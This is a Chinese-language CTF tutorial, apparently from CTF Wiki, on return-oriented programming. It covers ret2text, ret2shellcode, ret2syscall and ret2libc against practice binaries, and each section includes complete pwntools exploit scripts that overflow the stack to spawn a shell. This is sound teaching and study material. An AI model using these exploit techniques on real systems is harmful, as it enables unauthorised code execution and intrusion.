# 基本 ROP

隨着 NX (Non-eXecutable) 保護的開啓，傳統的直接向棧或者堆上直接注入代碼的方式難以繼續發揮效果，由此攻擊者們也提出來相應的方法來繞過保護。

目前被廣泛使用的攻擊手法是 **返回導向編程** (Return Oriented Programming)，其主要思想是在 **棧緩衝區溢出的基礎上，利用程序中已有的小片段( gadgets )來改變某些寄存器或者變量的值，從而控制程序的執行流程。** 

gadgets 通常是以 `ret` 結尾的指令序列，通過這樣的指令序列，我們可以多次劫持程序控制流，從而運行特定的指令序列，以完成攻擊的目的。

返回導向編程這一名稱的由來是因爲其核心在於利用了指令集中的 ret 指令，從而改變了指令流的執行順序，並通過數條 gadget “執行” 了一個新的程序。

使用 ROP 攻擊一般得滿足如下條件：

- 程序漏洞允許我們劫持控制流，並控制後續的返回地址。

- 可以找到滿足條件的 gadgets 以及相應 gadgets 的地址。

作爲一項基本的攻擊手段，ROP 攻擊並不侷限於棧溢出漏洞，也被廣泛應用在堆溢出等各類漏洞的利用當中。

需要注意的是，現代操作系統通常會開啓地址隨機化保護（ASLR），這意味着 gadgets 在內存中的位置往往是不固定的。但幸運的是其相對於對應段基址的偏移通常是固定的，因此我們在尋找到了合適的 gadgets 之後可以通過其他方式泄漏程序運行環境信息，從而計算出 gadgets 在內存中的真正地址。

## ret2text

### 原理

ret2text 即控制程序執行程序本身已有的的代碼 (即， `.text` 段中的代碼) 。其實，這種攻擊方法是一種籠統的描述。我們控制執行程序已有的代碼的時候也可以控制程序執行好幾段不相鄰的程序已有的代碼(也就是 gadgets)，這就是我們所要說的ROP。

這時，我們需要知道對應返回的代碼的位置。當然程序也可能會開啓某些保護，我們需要想辦法去繞過這些保護。

### 例子

其實，在棧溢出的基本原理中，我們已經介紹了這一簡單的攻擊。在這裏，我們再給出另外一個例子，bamboofox 中介紹 ROP 時使用的 ret2text 的例子。

> 點擊下載: [ret2text](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text/ret2text)

首先，查看一下程序的保護機制：

```shell
➜  ret2text checksec ret2text
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

可以看出程序是 32 位程序，且僅開啓了棧不可執行保護。接下來我們使用 IDA 反編譯該程序：

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("There is something amazing here, do you know anything?");
  gets((char *)&v4);
  printf("Maybe I will tell you next time !");
  return 0;
}
```

可以看出程序在主函數中使用了 gets 函數，顯然存在棧溢出漏洞。接下來查看反彙編代碼：

```asm
.text:080485FD secure          proc near
.text:080485FD
.text:080485FD input           = dword ptr -10h
.text:080485FD secretcode      = dword ptr -0Ch
.text:080485FD
.text:080485FD                 push    ebp
.text:080485FE                 mov     ebp, esp
.text:08048600                 sub     esp, 28h
.text:08048603                 mov     dword ptr [esp], 0 ; timer
.text:0804860A                 call    _time
.text:0804860F                 mov     [esp], eax      ; seed
.text:08048612                 call    _srand
.text:08048617                 call    _rand
.text:0804861C                 mov     [ebp+secretcode], eax
.text:0804861F                 lea     eax, [ebp+input]
.text:08048622                 mov     [esp+4], eax
.text:08048626                 mov     dword ptr [esp], offset unk_8048760
.text:0804862D                 call    ___isoc99_scanf
.text:08048632                 mov     eax, [ebp+input]
.text:08048635                 cmp     eax, [ebp+secretcode]
.text:08048638                 jnz     short locret_8048646
.text:0804863A                 mov     dword ptr [esp], offset command ; "/bin/sh"
.text:08048641                 call    _system
```

在 secure 函數又發現了存在調用 `system("/bin/sh")` 的代碼，那麼如果我們直接控制程序返回至 `0x0804863A` ，那麼就可以得到系統的 shell 了。

下面就是我們如何構造 payload 了，首先需要確定的是我們能夠控制的內存的起始地址距離 main 函數的返回地址的字節數。

```asm
.text:080486A7                 lea     eax, [esp+1Ch]
.text:080486AB                 mov     [esp], eax      ; s
.text:080486AE                 call    _gets
```

可以看到該字符串是通過相對於 esp 的索引，所以我們需要進行調試，將斷點下在 call 處，查看 esp，ebp，如下：

```shell
gef➤  b *0x080486AE
Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.
gef➤  r
There is something amazing here, do you know anything?

Breakpoint 1, 0x080486ae in main () at ret2text.c:24
24	    gets(buf);
───────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0xffffcd5c  →  0x08048329  →  "__libc_start_main"
$ebx   : 0x00000000
$ecx   : 0xffffffff
$edx   : 0xf7faf870  →  0x00000000
$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  "__libc_start_main"
$ebp   : 0xffffcdc8  →  0x00000000
$esi   : 0xf7fae000  →  0x001b1db0
$edi   : 0xf7fae000  →  0x001b1db0
$eip   : 0x080486ae  →  <main+102> call 0x8048460 <gets@plt>
```


可以看到 esp 爲 0xffffcd40，ebp 爲 0xffffcdc8，同時 s 相對於 esp 的索引爲 `esp+0x1c`，因此，我們可以推斷：

- s 的地址爲 0xffffcd5c
- s 相對於 ebp 的偏移爲 0x6c
- s 相對於返回地址的偏移爲 0x6c+4

因此最後的 payload 如下：

```python
##!/usr/bin/env python
from pwn import *

sh = process('./ret2text')
target = 0x804863a
sh.sendline(b'A' * (0x6c + 4) + p32(target))
sh.interactive()
```

## ret2shellcode

### 原理

ret2shellcode，即控制程序執行 shellcode 代碼。shellcode 指的是用於完成某個功能的彙編代碼，常見的功能主要是獲取目標系統的 shell。**通常情況下，shellcode 需要我們自行編寫，即此時我們需要自行向內存中填充一些可執行的代碼**。

在棧溢出的基礎上，要想執行 shellcode，需要對應的 binary 在運行時，shellcode 所在的區域具有可執行權限。

需要注意的是，**在新版內核當中引入了較爲激進的保護策略，程序中通常不再默認有同時具有可寫與可執行的段，這使得傳統的 ret2shellcode 手法不再能直接完成利用**。

### 例子

這裏我們以 bamboofox 中的 ret2shellcode 爲例，需要注意的是，你應當在內核版本較老的環境中進行實驗（如 Ubuntu 18.04 或更老版本）。由於容器環境間共享同一內核，因此這裏我們無法通過 docker 完成環境搭建。

> 點擊下載: [ret2shellcode](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode)

首先檢測程序開啓的保護：

```shell
➜  ret2shellcode checksec ret2shellcode
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

可以看出源程序幾乎沒有開啓任何保護，並且有可讀，可寫，可執行段。接下來我們再使用 IDA 對程序進行反編譯：

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No system for you this time !!!");
  gets((char *)&v4);
  strncpy(buf2, (const char *)&v4, 0x64u);
  printf("bye bye ~");
  return 0;
}
```

可以看出，程序仍然是基本的棧溢出漏洞，不過這次還同時將對應的字符串複製到 buf2 處。簡單查看可知 buf2 在 bss 段。

```asm
.bss:0804A080                 public buf2
.bss:0804A080 ; char buf2[100]
```

這時，我們簡單的調試下程序，看看這一個 bss 段是否可執行。

```shell
gef➤  b main
Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.
gef➤  r
Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 

Breakpoint 1, main () at ret2shellcode.c:8
8	    setvbuf(stdout, 0LL, 2, 0LL);
─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]────
      6	 int main(void)
      7	 {
 →    8	     setvbuf(stdout, 0LL, 2, 0LL);
      9	     setvbuf(stdin, 0LL, 1, 0LL);
     10	 
─────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x8048536 → Name: main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  vmmap 
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so
0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so
0xf7faf000 0xf7fb2000 0x00000000 rwx 
0xf7fd3000 0xf7fd5000 0x00000000 rwx 
0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]
0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]
0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffb000 0xf7ffc000 0x00000000 rwx 
0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 0x00000000 rwx [stack]
```

通過 vmmap，我們可以看到 bss 段對應的段具有可執行權限：

```text
0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
```

那麼這次我們就控制程序執行 shellcode，也就是讀入 shellcode，然後控制程序執行 bss 段處的 shellcode。其中，相應的偏移計算類似於 ret2text 中的例子。

最後的 payload 如下：

```python
#!/usr/bin/env python
from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

sh.sendline(shellcode.ljust(112, b'A') + p32(buf2_addr))
sh.interactive()
```

### 題目

- sniperoj-pwn100-shellcode-x86-64

## ret2syscall

### 原理

ret2syscall，即控制程序執行系統調用，獲取 shell。

### 例子

這裏我們繼續以 bamboofox 中的 ret2syscall 爲例。  

> 點擊下載: [ret2syscall](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop)

首先檢測程序開啓的保護：

```shell
➜  ret2syscall checksec rop
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

可以看出，源程序爲 32 位，開啓了 NX 保護。接下來利用 IDA 進行反編譯：

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("This time, no system() and NO SHELLCODE!!!");
  puts("What do you plan to do?");
  gets(&v4);
  return 0;
}
```

可以看出此次仍然是一個棧溢出。類似於之前的做法，我們可以獲得 v4 相對於 ebp 的偏移爲 108。所以我們需要覆蓋的返回地址相對於 v4 的偏移爲 112。此次，由於我們不能直接利用程序中的某一段代碼或者自己填寫代碼來獲得 shell，所以我們利用程序中的 gadgets 來獲得 shell，而對應的 shell 獲取則是利用系統調用。關於系統調用的知識，請參考：

- https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8

簡單地說，只要我們把對應獲取 shell 的系統調用的參數放到對應的寄存器中，那麼我們在執行 int 0x80 就可執行對應的系統調用。比如說這裏我們利用如下系統調用來獲取 shell：

```C
execve("/bin/sh",NULL,NULL)
```

其中，該程序是 32 位，所以我們需要使得

- 系統調用號，即 eax 應該爲 0xb
- 第一個參數，即 ebx 應該指向 /bin/sh 的地址，其實執行 sh 的地址也可以。
- 第二個參數，即 ecx 應該爲 0
- 第三個參數，即 edx 應該爲 0

而我們如何控制這些寄存器的值 呢？這裏就需要使用 gadgets。比如說，現在棧頂是 10，那麼如果此時執行了pop eax，那麼現在 eax 的值就爲 10。但是我們並不能期待有一段連續的代碼可以同時控制對應的寄存器，所以我們需要一段一段控制，這也是我們在 gadgets 最後使用 ret 來再次控制程序執行流程的原因。具體尋找 gadgets的方法，我們可以使用 ropgadgets 這個工具。

首先，我們來尋找控制 eax 的gadgets

```shell
➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
```

可以看到有上述幾個都可以控制 eax，我選取第二個來作爲 gadgets。

類似的，我們可以得到控制其它寄存器的 gadgets

```shell
➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'
0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be23f : pop ebx ; pop edi ; ret
0x0806eb69 : pop ebx ; pop edx ; ret
0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7d3c : pop ebx ; ret 0x6f9
0x08099c87 : pop ebx ; ret 8
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806336b : pop edi ; pop esi ; pop ebx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
0x0805c820 : pop esi ; pop ebx ; ret
0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0807b6ed : pop ss ; pop ebx ; ret
```

這裏，我選擇

```text
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
```

這個可以直接控制其它三個寄存器。

此外，我們需要獲得 /bin/sh 字符串對應的地址。

```shell
➜  ret2syscall ROPgadget --binary rop  --string '/bin/sh' 
Strings information
============================================================
0x080be408 : /bin/sh
```

可以找到對應的地址，此外，還有 int 0x80 的地址，如下

```text
➜  ret2syscall ROPgadget --binary rop  --only 'int'                 
Gadgets information
============================================================
0x08049421 : int 0x80
0x080938fe : int 0xbb
0x080869b5 : int 0xf6
0x0807b4d4 : int 0xfc

Unique gadgets found: 4
```

同時，也找到對應的地址了。

下面就是對應的 payload，其中 0xb 爲 execve 對應的系統調用號。

```python
#!/usr/bin/env python
from pwn import *

sh = process('./rop')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(
    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
sh.sendline(payload)
sh.interactive()
```

### 題目

## ret2libc

### 原理

ret2libc 即控制函數的執行 libc 中的函數，通常是返回至某個函數的 plt 處或者函數的具體位置(即函數對應的 got表項的內容)。一般情況下，我們會選擇執行 system("/bin/sh")，故而此時我們需要知道 system 函數的地址。

### 例子

我們由簡單到難分別給出三個例子。

#### 例1

這裏我們以 bamboofox 中 ret2libc1 爲例。 

> 點擊下載: [ret2libc1](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc1/ret2libc1)

首先，我們檢查一下程序的安全保護：

```shell
➜  ret2libc1 checksec ret2libc1    
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

源程序爲 32 位，開啓了 NX 保護。下面對程序進行反編譯以確定漏洞位置：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("RET2LIBC >_<");
  gets((char *)&v4);
  return 0;
}
```

可以看到在執行 gets 函數的時候出現了棧溢出。此外，利用 ropgadget，我們可以查看是否有 /bin/sh 存在：

```shell
➜  ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh'          
Strings information
============================================================
0x08048720 : /bin/sh
```

確實存在，再次查找一下是否有 system 函數存在。經在 ida 中查找，確實也存在。

```asm
.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]
```

那麼，我們直接返回該處，即執行 system 函數。相應的 payload 如下：

```python
#!/usr/bin/env python
from pwn import *

sh = process('./ret2libc1')

binsh_addr = 0x8048720
system_plt = 0x08048460
payload = flat([b'a' * 112, system_plt, b'b' * 4, binsh_addr])
sh.sendline(payload)

sh.interactive()
```

這裏我們需要注意函數調用棧的結構，如果是正常調用 system 函數，我們調用的時候會有一個對應的返回地址，這裏以 `'bbbb'` 作爲虛假的地址，其後參數對應的參數內容。

這個例子相對來說簡單，同時提供了 system 地址與 /bin/sh 的地址，但是大多數程序並不會有這麼好的情況。

#### 例2

這裏以 bamboofox 中的 ret2libc2 爲例 。

> 點擊下載: [ret2libc2](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc2/ret2libc2)

該題目與例 1 基本一致，只不過不再出現 /bin/sh 字符串，所以此次需要我們自己來讀取字符串，所以我們需要兩個 gadgets，第一個控制程序讀取字符串，第二個控制程序執行 system("/bin/sh")。由於漏洞與上述一致，這裏就不在多說，具體的 exp 如下：

```python
##!/usr/bin/env python
from pwn import *

sh = process('./ret2libc2')

gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x804a080
payload = flat(
    [b'a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
sh.sendline(payload)
sh.sendline(b'/bin/sh')
sh.interactive()
```

需要注意的是，我這裏向程序中 bss 段的 buf2 處寫入 /bin/sh 字符串，並將其地址作爲 system 的參數傳入。這樣以便於可以獲得 shell。

#### 例3

這裏以 bamboofox 中的 ret2libc3 爲例  。

> 點擊下載: [ret2libc3](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc3/ret2libc3)

在例 2 的基礎上，再次將 system 函數的地址去掉。此時，我們需要同時找到 system 函數地址與 /bin/sh 字符串的地址。首先，查看安全保護

```shell
➜  ret2libc3 checksec ret2libc3
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

可以看出，源程序仍舊開啓了堆棧不可執行保護。進而查看源碼，發現程序的 bug 仍然是棧溢出：

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No surprise anymore, system disappeard QQ.");
  printf("Can you find it !?");
  gets((char *)&v4);
  return 0;
}
```

那麼我們如何得到 system 函數的地址呢？這裏就主要利用了兩個知識點：

- system 函數屬於 libc，而 libc.so 動態鏈接庫中的函數之間相對偏移是固定的。
- 即使程序有 ASLR 保護，也只是針對於地址中間位進行隨機，最低的12位並不會發生改變。而 libc 在github上有人進行收集，如下
  - https://github.com/niklasb/libc-database

所以如果我們知道 libc 中某個函數的地址，那麼我們就可以確定該程序利用的 libc。進而我們就可以知道 system函數的地址。

那麼如何得到 libc 中的某個函數的地址呢？我們一般常用的方法是採用 got 表泄露，即輸出某個函數對應的 got 表項的內容。**當然，由於 libc 的延遲綁定機制，我們需要泄漏已經執行過的函數的地址。**

我們自然可以根據上面的步驟先得到 libc，之後在程序中查詢偏移，然後再次獲取 system 地址，但這樣手工操作次數太多，有點麻煩，這裏給出一個 libc 的利用工具，具體細節請參考 readme：

- https://github.com/lieanu/LibcSearcher

此外，在得到 libc 之後，其實 libc 中也是有 /bin/sh 字符串的，所以我們可以一起獲得 /bin/sh 字符串的地址。

這裏我們泄露 __libc_start_main 的地址，這是因爲它是程序最初被執行的地方。基本利用思路如下

- 泄露 __libc_start_main 地址
- 獲取 libc 版本
- 獲取 system 地址與 /bin/sh 的地址
- 再次執行源程序
- 觸發棧溢出執行 system(‘/bin/sh’)

exp 如下：

```python
#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
sh = process('./ret2libc3')

ret2libc3 = ELF('./ret2libc3')

puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']

print("leak libc_start_main_got addr and return to main again")
payload = flat([b'A' * 112, puts_plt, main, libc_start_main_got])
sh.sendlineafter(b'Can you find it !?', payload)

print("get the related addr")
libc_start_main_addr = u32(sh.recv()[0:4])
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

print("get shell")
payload = flat([b'A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()

```

### 題目

- train.cs.nctu.edu.tw: ret2libc

## 題目

- train.cs.nctu.edu.tw: rop
- 2013-PlaidCTF-ropasaurusrex
- Defcon 2015 Qualifier: R0pbaby

## 參考閱讀

- [烏雲一步一步ROP篇(蒸米)](http://wooyun.jozxing.cc/static/drops/tips-6597.html)
- [手把手教你棧溢出從入門到放棄（上）](https://zhuanlan.zhihu.com/p/25816426)
- [手把手教你棧溢出從入門到放棄（下）](https://zhuanlan.zhihu.com/p/25892385)
- [【技術分享】現代棧溢出利用技術基礎：ROP](http://bobao.360.cn/learning/detail/3694.html)

